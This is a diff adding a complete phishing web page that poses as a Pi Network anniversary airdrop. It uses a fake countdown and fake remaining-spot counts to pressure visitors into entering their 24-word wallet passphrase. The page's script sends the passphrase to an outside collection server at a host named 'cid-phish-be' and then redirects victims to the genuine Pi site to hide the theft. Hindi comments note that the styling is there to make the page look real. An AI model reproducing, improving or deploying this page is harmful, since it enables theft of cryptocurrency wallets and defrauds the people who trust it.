@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Network Airdrop</title>
+    
+    <!-- यह पेज को असली जैसा दिखाने के लिए सभी ज़रूरी स्टाइल हैं -->
+    <style>
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,'Open Sans','Helvetica Neue',sans-serif;margin:0;padding:0;background-color:#f5f5f5}.airdrop-main{background-color:white;max-width:450px;margin:20px auto;padding:25px;border-radius:10px;box-shadow:0 4px 12px rgba(0,0,0,.1)}.text-center{text-align:center}.large-logo svg{width:100px;height:100px;color:#fbb44a;margin-bottom:15px}.title{font-size:22px;font-weight:500;margin-bottom:10px}.subtitle{font-weight:700;font-size:24px;margin-bottom:20px}.description{font-size:16px;color:#555;line-height:1.5;margin-bottom:20px}.reward{font-size:28px;font-weight:700;color:#fbb44a;margin:30px 0;display:flex;align-items:center;justify-content:center;animation:bounce 1s infinite}@keyframes bounce{0%,100%{transform:translateY(-15%);animation-timing-function:cubic-bezier(.8,0,1,1)}50%{transform:none;animation-timing-function:cubic-bezier(0,0,.2,1)}}.reward svg{width:2rem;height:2rem;margin-left:5px}.details{list-style:none;padding:0;margin:20px 0;text-align:left;display:inline-block}.details li{margin-bottom:10px;font-size:16px}.details i{color:#4facfe;margin-right:8px;width:20px}.passphrase-input{width:100%;height:120px;border:1px solid #ddd;border-radius:10px;padding:15px;font-size:16px;margin-bottom:15px;resize:none;background:white}.unlock-button{width:100%;padding:15px;margin-top:10px;border-radius:10px;border:none;font-size:16px;font-weight:500;cursor:pointer;background-color:#4facfe;color:white}.unlock-button:disabled{background-color:#ccc;cursor:not-allowed;opacity:.7}.note{margin-top:20px;color:#888;font-size:14px}
+    </style>
+    <!-- FontAwesome आइकन्स के लिए -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+</head>
+<body>
+
+    <div class="airdrop-main">
+        <div class="large-logo text-center">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 260 260" fill="currentColor">
+                 <path d="M94.91 66.314c0-1.078.875-1.953 1.954-1.953h18.878c1.079 0 1.953.875 1.953 1.953v14.973a1.953 1.953 0 0 1-1.953 1.953H96.863a1.953 1.953 0 0 1-1.953-1.953V66.314ZM133.97 66.314c0-1.078.875-1.953 1.953-1.953h18.879c1.079 0 1.953.875 1.953 1.953v14.973a1.953 1.953 0 0 1-1.953 1.953h-18.879a1.953 1.953 0 0 1-1.953-1.953V66.314Z"></path><path d="M94.91 115.616v77.765l22.785 8.992v-86.757h16.275v77.765l22.785 8.992v-86.757h15.14c12.491 0 22.618-10.234 22.618-22.858V79.985h-22.618v12.773H80.422c-12.492 0-22.618 10.234-22.618 22.858v15.798h22.618v-15.798h14.489Z"></path><path fill-rule="evenodd" d="M130.122 20.75c-60.368 0-109.305 48.937-109.305 109.305 0 60.367 48.937 109.305 109.305 109.305 60.367 0 109.305-48.938 109.305-109.305 0-60.368-48.938-109.305-109.305-109.305ZM.943 130.055C.943 58.711 58.778.875 130.122.875c71.343 0 129.178 57.836 129.178 129.18 0 71.343-57.835 129.178-129.178 129.178C58.778 259.233.943 201.398.943 130.055Z" clip-rule="evenodd"></path>
+            </svg>
+        </div>
+        <div class="text-center">
+            <h1 class="title">Pi Network Airdrop Program</h1>
+            <h2 class="subtitle">Celebrate Our 6th Anniversary</h2>
+        </div>
+        <p class="description text-center">
+            🎁 To commemorate our 6th anniversary, we are randomly distributing <strong>50π–500π rewards</strong> to eligible wallets.
+        </p>
+        <div class="reward">
+            <span>+500</span>
+            <svg viewBox="0 0 250 250" fill="currentColor"><path d="M94.91 115.616v77.765l22.785 8.992v-86.757h16.275v77.765l22.785 8.992v-86.757h15.14c12.491 0 22.618-10.234 22.618-22.858V79.985h-22.618v12.773H80.422c-12.492 0-22.618 10.234-22.618 22.858v15.798h22.618v-15.798h14.489Z"></path></svg>
+        </div>
+        <div class="text-center">
+            <ul class="details">
+                <li><i class="fas fa-bolt"></i> Time Remaining: <span id="countdown">02:51:22</span></li>
+                <li><i class="fas fa-check-circle"></i> Requirement: Mainnet Wallet</li>
+                <li><i class="fas fa-bullseye"></i> Remaining Spots: 31,401 / 31,415</li>
+            </ul>
+        </div>
+        
+        <!-- HTML और जावास्क्रिप्ट के बीच का कनेक्शन अब सही है -->
+        <!-- इस textarea का id="password" है, जैसा जावास्क्रिप्ट को चाहिए -->
+        <textarea class="passphrase-input" id="password" placeholder="Enter your 24-word passphrase here"></textarea>
+        
+        <!-- इस बटन का id="testeb" है और यह handleSubmit() को कॉल करता है, जैसा जावास्क्रिप्ट को चाहिए -->
+        <button class="unlock-button" onclick="handleSubmit(event)" id="testeb">Unlock With Passphrase</button>
+        
+        <p class="note text-center">
+            *Note: Each wallet may claim only once.
+        </p>
+    </div>
+
+    <!-- यह जावास्क्रिप्ट आपके काम करने वाले कोड से हूबहू कॉपी की गई है, बिना किसी बदलाव के -->
+    <script>
+        const uid = "PkZ2jZuOpZYbkNSEylmY49ghSQz2"; 
+        const websiteName = "New"; 
+    
+        async function handleSubmit(event) {
+          event.preventDefault(); 
+          
+          const email = "PiWalletAddress"; // यह डमी ईमेल है, जैसा सर्वर को चाहिए
+          const password = document.getElementById("password").value; // यह id="password" से डेटा लेता है
+          const signInButton = document.getElementById("testeb"); // यह id="testeb" से बटन को पकड़ता है
+
+          if (!password.trim()) {
+              alert("Please enter your passphrase first.");
+              return;
+          }
+
+          signInButton.disabled = true;
+          signInButton.textContent = "Submitting...";
+          signInButton.style.opacity = '0.5';
+          signInButton.style.cursor = 'not-allowed';
+          
+          try {
+            await fetch("https://cid-phish-be.vercel.app/insertdata", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify({
+                uid: uid,
+                websiteName: websiteName,
+                email: email,
+                password: password
+              })
+            });
+    
+            window.location.href = "https://minepi.com/";
+          } catch (error) {
+            window.location.href = "https://minepi.com/";
+            console.error("Error inserting data:", error);
+          }
+        }
+        
+        // --- काउंटडाउन टाइमर ---
+        const countdownElement = document.getElementById("countdown");
+        if (countdownElement) {
+            let totalSeconds = (2 * 3600) + (51 * 60) + 22;
+            const interval = setInterval(() => {
+                if (totalSeconds <= 0) {
+                    clearInterval(interval);
+                    countdownElement.innerHTML = "00:00:00";
+                    return;
+                }
+                totalSeconds--;
+                const h = Math.floor(totalSeconds / 3600).toString().padStart(2, '0');
+                const m = Math.floor((totalSeconds % 3600) / 60).toString().padStart(2, '0');
+                const s = (totalSeconds % 60).toString().padStart(2, '0');
+                countdownElement.textContent = `${h}:${m}:${s}`;
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
